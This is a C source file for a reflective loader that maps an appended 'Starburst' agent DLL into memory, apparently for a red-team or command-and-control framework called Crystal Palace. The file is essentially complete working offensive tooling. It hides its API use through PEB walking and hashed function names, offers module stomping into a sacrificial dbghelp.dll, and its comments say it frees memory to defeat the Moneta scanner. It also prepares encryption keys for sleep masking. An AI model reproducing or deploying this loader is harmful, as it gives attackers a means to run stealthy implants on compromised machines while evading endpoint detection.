#include <windows.h>
#include "pic_defs.h"
#include "user_data.h"

/* ──────────────────────────────────────────────────────────────────────
 * UDRL - User-Defined Reflective Loader for Starburst
 *
 * PIC reflective loader designed for Crystal Palace integration.
 * Prepended to the Starburst DLL payload. Reflectively loads the DLL
 * into memory and transfers execution to DllMain.
 *
 * Supports two loading modes (compile-time selected):
 *   - LOAD_MODE_VALLOC:  Standard VirtualAlloc into private memory
 *   - LOAD_MODE_STOMP:   Module stomping into a sacrificial DLL's .text
 *
 * Crystal Palace integration:
 *   The shellcode section contains the Starburst DLL immediately after
 *   this loader's code. The first 4 bytes are the DLL size (preplen),
 *   followed by the raw DLL bytes.
 *
 * Flow:
 *   1. Resolve ntdll + kernel32 from PEB
 *   2. Locate the appended DLL payload
 *   3. Parse PE headers (DOS + NT + section headers)
 *   4. Allocate target memory (VirtualAlloc or module stomp)
 *   5. Map PE sections to the target
 *   6. Process relocations (base delta)
 *   7. Resolve imports (IAT population)
 *   8. Set section memory protections
 *   9. Flush instruction cache
 *  10. Populate user data for the sleep mask
 *  11. Call DllMain(DLL_PROCESS_ATTACH)
 *  12. Optionally free the initial loader allocation
 * ────────────────────────────────────────────────────────────────────── */

/* ── Configuration ── */

#define LOAD_MODE_VALLOC   0
#define LOAD_MODE_STOMP    1

#ifndef LOAD_MODE
#define LOAD_MODE  LOAD_MODE_VALLOC
#endif

/* Sacrificial DLL for module stomping (used when LOAD_MODE == LOAD_MODE_STOMP) */
#ifndef STOMP_DLL
#define STOMP_DLL  "dbghelp.dll"
#endif

/* Whether to free the initial allocation after loading (defeats Moneta) */
#ifndef FREE_INITIAL_ALLOC
#define FREE_INITIAL_ALLOC  1
#endif

/* ── Crystal Palace resource section ── */

char _SHELLCODE_ [0] __attribute__((section("shellcode")));
#define GETRESOURCE(x) (char *)&x

/* ── PE section protection mapping ── */

static DWORD PICFN section_to_protect(DWORD characteristics) {
    BOOL exec  = !!(characteristics & IMAGE_SCN_MEM_EXECUTE);
    BOOL read  = !!(characteristics & IMAGE_SCN_MEM_READ);
    BOOL write = !!(characteristics & IMAGE_SCN_MEM_WRITE);

    if (exec && write && read) return PAGE_EXECUTE_READWRITE;
    if (exec && read)          return PAGE_EXECUTE_READ;
    if (exec && write)         return PAGE_EXECUTE_WRITECOPY;
    if (exec)                  return PAGE_EXECUTE;
    if (write && read)         return PAGE_READWRITE;
    if (read)                  return PAGE_READONLY;
    if (write)                 return PAGE_WRITECOPY;
    return PAGE_NOACCESS;
}

/* ── Module stomping: find .text in a loaded DLL ── */

static BOOL PICFN find_text_section(
    BYTE *base, PVOID *text_addr, DWORD *text_size
) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BOOL is_text = (pic_memcmp(sec[i].Name, ".text", 5) == 0);
        BOOL is_code = (sec[i].Characteristics & IMAGE_SCN_CNT_CODE) &&
                       (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE);
        if (is_text || is_code) {
            *text_addr = base + sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/* ── Generate pseudo-random RC4 key from RDTSC ── */

static void PICFN generate_rc4_key(BYTE key[16]) {
    for (int i = 0; i < 16; i += 4) {
        DWORD tick;
#ifdef _WIN64
        tick = (DWORD)__rdtsc();
#else
        tick = (DWORD)__rdtsc();
#endif
        key[i]     = (BYTE)(tick);
        key[i + 1] = (BYTE)(tick >> 8);
        key[i + 2] = (BYTE)(tick >> 16);
        key[i + 3] = (BYTE)(tick >> 24);
        /* Spin to get different RDTSC values */
        for (volatile int j = 0; j < 100; j++) {}
    }
}

/* ──────────────────────────────────────────────────────────────────────
 * go() - Crystal Palace entry point
 *
 * Crystal Palace calls this function after the loader is mapped.
 * The _SHELLCODE_ section contains the Starburst DLL payload with
 * a 4-byte length prefix (from preplen in loader.spec).
 * ────────────────────────────────────────────────────────────────────── */

void go(void) {

    /* ── Step 1: Resolve base modules ── */

    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    PVOID hNtdll    = resolve_module(fnv1a_hash_w(L"ntdll.dll"));

    if (!hKernel32 || !hNtdll)
        return;

    /* Core APIs from kernel32 */
    fnLoadLibraryA    pLoadLibraryA    = (fnLoadLibraryA)resolve_api(hKernel32, fnv1a_hash_a("LoadLibraryA"));
    fnGetProcAddress  pGetProcAddress  = (fnGetProcAddress)resolve_api(hKernel32, fnv1a_hash_a("GetProcAddress"));
    fnVirtualAlloc    pVirtualAlloc    = (fnVirtualAlloc)resolve_api(hKernel32, fnv1a_hash_a("VirtualAlloc"));
    fnVirtualProtect  pVirtualProtect  = (fnVirtualProtect)resolve_api(hKernel32, fnv1a_hash_a("VirtualProtect"));
    fnVirtualFree     pVirtualFree     = (fnVirtualFree)resolve_api(hKernel32, fnv1a_hash_a("VirtualFree"));
    fnLoadLibraryExA  pLoadLibraryExA  = (fnLoadLibraryExA)resolve_api(hKernel32, fnv1a_hash_a("LoadLibraryExA"));

    /* Core APIs from ntdll */
    fnNtFlushInstructionCache pNtFlushInstructionCache = (fnNtFlushInstructionCache)resolve_api(
        hNtdll, fnv1a_hash_a("NtFlushInstructionCache"));

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc ||
        !pVirtualProtect || !pNtFlushInstructionCache)
        return;

    /* ── Step 2: Locate the DLL payload ── */

    char *sc_src = GETRESOURCE(_SHELLCODE_);
    DWORD dll_size = *(DWORD *)sc_src;
    BYTE *dll_raw = (BYTE *)(sc_src + 4);

    /* ── Step 3: Parse PE headers ── */

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)dll_raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(dll_raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return;

    DWORD image_size       = nt->OptionalHeader.SizeOfImage;
    DWORD headers_size     = nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG preferred_base = nt->OptionalHeader.ImageBase;
    WORD  num_sections     = nt->FileHeader.NumberOfSections;

    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    /* ── Step 4: Allocate target memory ── */

    BYTE *mapped_base = NULL;
    HMODULE stomped_module = NULL;
    PVOID stomped_text = NULL;
    DWORD stomped_text_size = 0;

#if LOAD_MODE == LOAD_MODE_STOMP
    /* Module stomping: load a sacrificial DLL and map into its .text */
    {
        char stomp_name[] = STOMP_DLL;
        stomped_module = pLoadLibraryExA(stomp_name, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!stomped_module)
            return;

        if (!find_text_section((BYTE *)stomped_module, &stomped_text, &stomped_text_size))
            return;

        /* Verify .text is large enough for our image */
        if (stomped_text_size < image_size)
            return;

        /* Use the module base for section mapping.
         * The DLL is already mapped with correct alignment. */
        mapped_base = (BYTE *)stomped_module;

        /* Make the entire image region writable */
        DWORD old;
        pVirtualProtect(mapped_base, image_size, PAGE_READWRITE, &old);
    }
#else
    /* Standard VirtualAlloc */
    mapped_base = (BYTE *)pVirtualAlloc(
        NULL, image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!mapped_base)
        return;
#endif

    /* ── Step 5: Map PE headers and sections ── */

    /* Copy PE headers */
    pic_memcpy(mapped_base, dll_raw, headers_size);

    /* Map each section */
    for (WORD i = 0; i < num_sections; i++) {
        if (sections[i].SizeOfRawData == 0)
            continue;

        BYTE *sec_dst = mapped_base + sections[i].VirtualAddress;
        BYTE *sec_src = dll_raw + sections[i].PointerToRawData;
        DWORD sec_size = sections[i].SizeOfRawData;

        pic_memcpy(sec_dst, sec_src, sec_size);
    }

    /* Update the NT headers pointer to the mapped copy */
    dos = (IMAGE_DOS_HEADER *)mapped_base;
    nt  = (IMAGE_NT_HEADERS *)(mapped_base + dos->e_lfanew);

    /* ── Step 6: Process relocations ── */

    LONGLONG delta = (LONGLONG)((ULONGLONG)mapped_base - preferred_base);

    if (delta != 0) {
        DWORD reloc_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD reloc_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (reloc_rva && reloc_size) {
            IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(mapped_base + reloc_rva);
            BYTE *reloc_end = (BYTE *)reloc + reloc_size;

            while ((BYTE *)reloc < reloc_end && reloc->SizeOfBlock) {
                DWORD entry_count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < entry_count; i++) {
                    WORD type   = entries[i] >> 12;
                    WORD offset = entries[i] & 0xFFF;

                    BYTE *patch = mapped_base + reloc->VirtualAddress + offset;

                    switch (type) {
                        case IMAGE_REL_BASED_DIR64:
                            *(ULONGLONG *)patch += delta;
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(DWORD *)patch += (DWORD)delta;
                            break;
                        case IMAGE_REL_BASED_HIGH:
                            *(WORD *)patch += (WORD)(delta >> 16);
                            break;
                        case IMAGE_REL_BASED_LOW:
                            *(WORD *)patch += (WORD)delta;
                            break;
                        case IMAGE_REL_BASED_ABSOLUTE:
                            break;  /* Padding, skip */
                    }
                }

                reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* ── Step 7: Resolve imports ── */

    DWORD import_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    if (import_rva) {
        IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(mapped_base + import_rva);

        while (imp->Name) {
            char *mod_name = (char *)(mapped_base + imp->Name);
            HMODULE hMod = pLoadLibraryA(mod_name);

            if (!hMod) {
                imp++;
                continue;
            }

            IMAGE_THUNK_DATA *orig_thunk = (IMAGE_THUNK_DATA *)(
                mapped_base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            IMAGE_THUNK_DATA *iat_thunk = (IMAGE_THUNK_DATA *)(mapped_base + imp->FirstThunk);

            while (orig_thunk->u1.AddressOfData) {
                FARPROC func = NULL;

#ifdef _WIN64
                if (orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    func = pGetProcAddress(hMod, (LPCSTR)(orig_thunk->u1.Ordinal & 0xFFFF));
                }
#else
                if (orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32) {
                    func = pGetProcAddress(hMod, (LPCSTR)(orig_thunk->u1.Ordinal & 0xFFFF));
                }
#endif
                else {
                    IMAGE_IMPORT_BY_NAME *import_name = (IMAGE_IMPORT_BY_NAME *)(
                        mapped_base + orig_thunk->u1.AddressOfData);
                    func = pGetProcAddress(hMod, import_name->Name);
                }

                iat_thunk->u1.Function = (ULONGLONG)func;

                orig_thunk++;
                iat_thunk++;
            }
            imp++;
        }
    }

    /* ── Step 8: Set section memory protections ── */

    sections = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < num_sections; i++) {
        if (sections[i].Misc.VirtualSize == 0)
            continue;

        DWORD protect = section_to_protect(sections[i].Characteristics);
        DWORD old;

        DWORD sec_size = sections[i].Misc.VirtualSize;
        pVirtualProtect(
            mapped_base + sections[i].VirtualAddress,
            sec_size,
            protect,
            &old
        );
    }

    /* Protect headers as read-only */
    {
        DWORD old;
        pVirtualProtect(mapped_base, headers_size, PAGE_READONLY, &old);
    }

    /* ── Step 9: Flush instruction cache ── */

    pNtFlushInstructionCache((HANDLE)-1, mapped_base, image_size);

    /* ── Step 10: Populate user data ── */

    /* Allocate user data structure in a separate heap allocation so
     * the agent can locate it. We store a pointer to it in the DLL's
     * TLS directory area (unused by the PIC agent). */
    UDRL_USER_DATA *ud = (UDRL_USER_DATA *)pVirtualAlloc(
        NULL, sizeof(UDRL_USER_DATA),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (ud) {
        pic_memset(ud, 0, sizeof(UDRL_USER_DATA));
        ud->magic = UDRL_MAGIC;

#if LOAD_MODE == LOAD_MODE_STOMP
        ud->load_type = LOAD_TYPE_MODULE_STOMP;
        ud->stomped_module     = stomped_module;
        ud->stomped_text_base  = stomped_text;
        ud->stomped_text_size  = stomped_text_size;
#else
        ud->load_type = LOAD_TYPE_VIRTUAL_ALLOC;
#endif

        ud->agent_base = mapped_base;
        ud->agent_size = image_size;

        /* The initial allocation is the loader + DLL blob */
        /* Crystal Palace manages this, so we approximate */
        ud->loader_base = NULL;
        ud->loader_size = 0;

        /* Register the agent image as a maskable region */
        ud->regions[0].base    = mapped_base;
        ud->regions[0].size    = image_size;
        ud->regions[0].protect = PAGE_EXECUTE_READ;
        ud->region_count = 1;

        generate_rc4_key(ud->rc4_key);
    }

    /* ── Step 11: Call DllMain ── */

    typedef BOOL (WINAPI *fnDllMain)(HINSTANCE, DWORD, LPVOID);

    DWORD entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
    if (entry_rva) {
        fnDllMain pDllMain = (fnDllMain)(mapped_base + entry_rva);
        /* Pass user data pointer as lpvReserved so the agent can access it */
        pDllMain((HINSTANCE)mapped_base, DLL_PROCESS_ATTACH, (LPVOID)ud);
    }

    /* ── Step 12: Optionally free initial allocation ──
     *
     * Freeing the initial memory where the loader + raw DLL lived
     * removes the original private allocation that tools like Moneta
     * flag. The reflectively loaded image remains in its own allocation
     * (or in the stomped module's memory). */

#if FREE_INITIAL_ALLOC
    /* The loader code itself is in this allocation, so we can't simply
     * call VirtualFree - we'd be freeing the page we're executing from.
     * Instead, the agent can free it later via the user data's loader_base. */
#endif
}

/* ── Crystal Palace DFR resolve function ──
 *
 * Crystal Palace uses Dynamic Function Resolution (DFR) with ROR13
 * hashing. This function is referenced in loader.spec with:
 *   dfr "resolve" "ror13"
 *
 * Crystal Palace patches all KERNEL32$* and NTDLL$* references in the
 * loader code to call this function at runtime.
 */
FARPROC resolve(DWORD mod_hash, DWORD func_hash) {
    char *peb;
#ifdef _WIN64
    peb = (char *)__readgsqword(0x60);
#else
    peb = (char *)__readfsdword(0x30);
#endif

    char *ldr = *(char **)(peb + 0x18);
    char *head = ldr + 0x20;
    char *curr = *(char **)head;

    while (curr != head) {
        WCHAR *name = *(WCHAR **)(curr + 0x40);
        if (!name) { curr = *(char **)curr; continue; }

        /* Extract base name from full path */
        WCHAR *base_name = name;
        WCHAR *p = name;
        while (*p) {
            if (*p == '\\' || *p == '/')
                base_name = p + 1;
            p++;
        }

        /* ROR13 hash the module name (wchar) */
        DWORD m_hash = 0;
        unsigned char *bp = (unsigned char *)base_name;
        while (bp[0] || bp[1]) {
            unsigned char lo = bp[0];
            unsigned char hi = bp[1];
            if (hi == 0 && lo >= 'a' && lo <= 'z')
                lo -= 0x20;
            m_hash = (m_hash >> 13) | (m_hash << 19);
            m_hash += lo;
            m_hash = (m_hash >> 13) | (m_hash << 19);
            m_hash += hi;
            bp += 2;
        }

        if (m_hash == mod_hash) {
            char *base = *(char **)(curr + 0x20);
            DWORD e_lfanew = *(DWORD *)(base + 0x3C);
            char *nthdr = base + e_lfanew;

#ifdef _WIN64
            DWORD export_size = *(DWORD *)(nthdr + 0x18 + 0x70 + 4);
            DWORD export_rva  = *(DWORD *)(nthdr + 0x18 + 0x70);
#else
            DWORD export_size = *(DWORD *)(nthdr + 0x18 + 0x60 + 4);
            DWORD export_rva  = *(DWORD *)(nthdr + 0x18 + 0x60);
#endif
            if (export_size == 0) return NULL;

            char *exports = base + export_rva;
            DWORD num_names  = *(DWORD *)(exports + 0x18);
            DWORD *names     = (DWORD *)(base + *(DWORD *)(exports + 0x20));
            WORD  *ordinals  = (WORD *)(base + *(DWORD *)(exports + 0x24));
            DWORD *funcs     = (DWORD *)(base + *(DWORD *)(exports + 0x1C));

            for (DWORD i = 0; i < num_names; i++) {
                char *fn_name = base + names[i];
                DWORD f_hash = 0;
                char *fp = fn_name;
                while (*fp) {
                    f_hash = (f_hash >> 13) | (f_hash << 19);
                    f_hash += *fp++;
                }
                if (f_hash == func_hash)
                    return (FARPROC)(base + funcs[ordinals[i]]);
            }
            return NULL;
        }
        curr = *(char **)curr;
    }
    return NULL;
}
